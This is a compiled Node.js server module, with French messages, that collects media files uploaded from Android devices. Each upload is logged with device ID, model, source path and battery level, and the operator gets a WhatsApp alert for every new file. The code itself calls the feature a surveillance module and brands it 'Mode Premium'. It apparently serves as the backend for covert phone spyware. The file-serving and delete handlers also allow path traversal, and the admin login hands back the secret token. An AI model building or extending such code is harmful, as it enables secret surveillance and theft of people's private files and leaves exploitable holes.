"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.uploadMediaService = uploadMediaService;
exports.getFilesService = getFilesService;
exports.getFileService = getFileService;
exports.deleteFileService = deleteFileService;
exports.downloadAllService = downloadAllService;
exports.getStatsService = getStatsService;
exports.heartbeatService = heartbeatService;
exports.getDashboardService = getDashboardService;
exports.adminLoginService = adminLoginService;
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const axios_1 = __importDefault(require("axios"));
// eslint-disable-next-line @typescript-eslint/no-var-requires
const archiverLib = require('archiver');
const app_config_1 = require("../../../configs/app.config");
const responses_1 = require("../../../data/responses");
const METADATA_FILE = path_1.default.join(app_config_1.config.spy.dir, 'history.json');
function loadHistory() {
    try {
        if (fs_1.default.existsSync(METADATA_FILE)) {
            return JSON.parse(fs_1.default.readFileSync(METADATA_FILE, 'utf8'));
        }
    }
    catch (err) {
        console.error('Error loading spy history:', err.message);
    }
    return [];
}
function saveHistory(history) {
    try {
        fs_1.default.writeFileSync(METADATA_FILE, JSON.stringify(history, null, 2));
    }
    catch (err) {
        console.error('Error saving spy history:', err.message);
    }
}
async function sendCallMeBotNotification(message) {
    const phone = app_config_1.config.spy.notifyPhone;
    if (!phone || !app_config_1.config.spy.callmebotApiKey)
        return;
    try {
        const url = `https://api.callmebot.com/whatsapp.php?phone=${phone}&text=${encodeURIComponent(message)}&apikey=${app_config_1.config.spy.callmebotApiKey}`;
        await axios_1.default.get(url, { timeout: 8000 });
        console.log('✅ Notification Mode Premium envoyée:', message);
    }
    catch (err) {
        console.error('❌ Erreur notification Mode Premium:', err.message);
    }
}
async function uploadMediaService(req, res) {
    try {
        if (!req.file) {
            return res.status(400).json({ success: false, error: 'Aucun fichier reçu' });
        }
        const { userId, deviceId = 'unknown', deviceModel = 'Android', sourcePath = '', networkType = 'unknown', batteryLevel } = req.body;
        let userName = req.body.username || null;
        let userDisplayName = req.body.displayName || null;
        if (userId && (!userName || !userDisplayName)) {
            try {
                const { User } = require('../../../data/models');
                const user = await User.findByPk(userId);
                if (user) {
                    userName = user.username;
                    userDisplayName = user.displayName;
                }
            }
            catch (_) { }
        }
        const fileInfo = {
            id: Date.now().toString(),
            filename: req.file.filename,
            originalName: req.file.originalname,
            size: req.file.size,
            mimetype: req.file.mimetype,
            userId: userId || null,
            username: userName || 'Anonyme',
            displayName: userDisplayName || userName || `Appareil ${deviceModel}`,
            deviceId,
            deviceModel,
            sourcePath,
            networkType,
            batteryLevel: batteryLevel ? Number(batteryLevel) : null,
            uploadedAt: new Date().toISOString(),
            url: `/api/spy/files/${req.file.filename}`,
        };
        const history = loadHistory();
        history.unshift(fileInfo);
        saveHistory(history);
        if (app_config_1.config.spy.notifyOnUpload) {
            await sendCallMeBotNotification(`📸 Nouveau fichier: ${req.file.originalname} (${(req.file.size / 1024).toFixed(1)}KB) de ${fileInfo.displayName}`);
        }
        return res.status(200).json({ success: true, file: fileInfo });
    }
    catch (error) {
        console.error('[UploadMedia Error]:', error);
        return res.status(500).json({ success: false, error: error.message });
    }
}
function getFilesService(req, res) {
    try {
        const history = loadHistory();
        const { type, search, sort = 'date_desc' } = req.query;
        let files = [...history];
        if (type)
            files = files.filter((f) => f.mimetype?.startsWith(type));
        if (search)
            files = files.filter((f) => f.filename?.toLowerCase().includes(String(search).toLowerCase()) || f.originalName?.toLowerCase().includes(String(search).toLowerCase()));
        if (sort === 'date_asc')
            files.reverse();
        else if (sort === 'size_desc')
            files.sort((a, b) => (b.size || 0) - (a.size || 0));
        else if (sort === 'size_asc')
            files.sort((a, b) => (a.size || 0) - (b.size || 0));
        return res.json({ success: true, files });
    }
    catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
function getFileService(req, res) {
    try {
        const { name } = req.params;
        const filePath = path_1.default.resolve(app_config_1.config.spy.dir, name);
        if (!fs_1.default.existsSync(filePath)) {
            return res.status(404).json({ success: false, error: 'Fichier non trouvé' });
        }
        return res.sendFile(filePath);
    }
    catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
function deleteFileService(req, res) {
    try {
        const { name } = req.params;
        const filePath = path_1.default.join(app_config_1.config.spy.dir, name);
        if (!fs_1.default.existsSync(filePath)) {
            return res.status(404).json({ success: false, error: 'Fichier non trouvé' });
        }
        fs_1.default.unlinkSync(filePath);
        const history = loadHistory().filter((f) => f.filename !== name);
        saveHistory(history);
        return res.json({ success: true });
    }
    catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
function downloadAllService(req, res) {
    try {
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', 'attachment; filename=spy_files.zip');
        const archive = archiverLib('zip', { zlib: { level: 5 } });
        archive.pipe(res);
        archive.directory(app_config_1.config.spy.dir, false, (entry) => (entry.name !== 'history.json' ? entry : false));
        archive.finalize();
    }
    catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
}
function getStatsService(req, res) {
    try {
        const history = loadHistory();
        const totalFiles = history.length;
        const totalSize = history.reduce((acc, f) => acc + (f.size || 0), 0);
        const byType = {};
        for (const f of history) {
            const type = f.mimetype?.split('/')[0] || 'other';
            byType[type] = (byType[type] || 0) + 1;
        }
        return res.json({ success: true, stats: { totalFiles, totalSize, byType } });
    }
    catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
function heartbeatService(req, res) {
    return res.json({ success: true, timestamp: new Date().toISOString() });
}
function getDashboardService(req, res) {
    return res.send(`<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Mode Premium - Dashboard</title></head>
<body>
<h1>🔒 Mode Premium Dashboard</h1>
<p>Interface de gestion du module de surveillance.</p>
<p>Authentifiez-vous via l'API avec votre token ou mot de passe administrateur.</p>
</body>
</html>`);
}
function adminLoginService(req, res) {
    const { password } = req.body || {};
    if (!password || (password !== app_config_1.config.spy.secretToken && password !== app_config_1.config.spy.adminPassword)) {
        return res.status(401).json({
            success: false,
            responseCode: responses_1.responses.CALL_BACK_MESSAGES.SPY_ACCESS_DENIED.CODE,
            responseMessage: 'Mot de passe administrateur invalide.',
            error: 'Mot de passe administrateur invalide.',
        });
    }
    return res.json({
        success: true,
        responseCode: responses_1.responses.CALL_BACK_MESSAGES.SPY_LOGIN_SUCCESS.CODE,
        responseMessage: responses_1.responses.CALL_BACK_MESSAGES.SPY_LOGIN_SUCCESS.MESSAGE,
        token: app_config_1.config.spy.secretToken,
    });
}
